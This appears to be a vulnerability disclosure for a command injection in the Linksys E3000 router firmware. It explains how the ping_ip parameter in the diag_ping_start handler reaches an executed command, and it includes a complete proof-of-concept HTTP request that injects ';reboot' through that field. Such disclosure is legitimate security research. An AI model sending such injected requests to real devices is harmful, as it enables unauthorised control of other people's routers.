## Linksys E3000 router RCE

Firmware Name: FW_E3000_1.0.06.002_US_20140409_code.bin

- Model: E3000

- Version: 1.0.06.002_US

- Test Environment: Ubuntu 18

- vendor website:https://www.linksys.com/

- Model page:https://store.linksys.com/support-product?sku=E3000

- firmware download link:https://drivers.softpedia.com/get/Router-Switch-Access-Point/Linksys/Linksys-E3000v1-Router-Firmware-1006-Build-2.shtml

![image](https://github.com/user-attachments/assets/f21cd7b3-5209-443b-8e2d-7408dc154d33)

![image](https://github.com/user-attachments/assets/dbf8de7b-65d9-41f3-9cbb-d089cbc7390e)


​      A command execution vulnerability has been identified in a Linksys E3000 router, which, due to inadequate back-end filtering, enables an attacker to remotely execute malicious code while obtaining login status. 

​      The vulnerability is located in the diag_ping_start function of httpd.

![image](https://github.com/user-attachments/assets/ed40a25d-d52a-46d1-aada-15b95d01971f)


​      The `cgi` variable receives the `ping_ip` argument from http, which is then concatenated in the `fprintf` function, and the concatenated string is executed in the file stream.

#### POC

```
POST /apply.cgi;session_id=ffce69721cd238c98c15730f910865c9 HTTP/1.1

Host: 192.168.3.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Referer: http://192.168.3.1/apply.cgi;session_id=8ea51f0aefb952cee1c1ad3372cd65a9

Content-Type: application/x-www-form-urlencoded

Content-Length: 153

Origin: http://192.168.3.1

Connection: close

Upgrade-Insecure-Requests: 1



submit_button=Diagnostics&change_action=gozila_cgi&submit_type=start_ping&gui_action=&commit=0&ping_ip=%3breboot&ping_size=32&ping_times=5&traceroute_ip=
```
![image](https://github.com/user-attachments/assets/3e1d5165-b951-438a-a19a-4058ebc1aa1a)

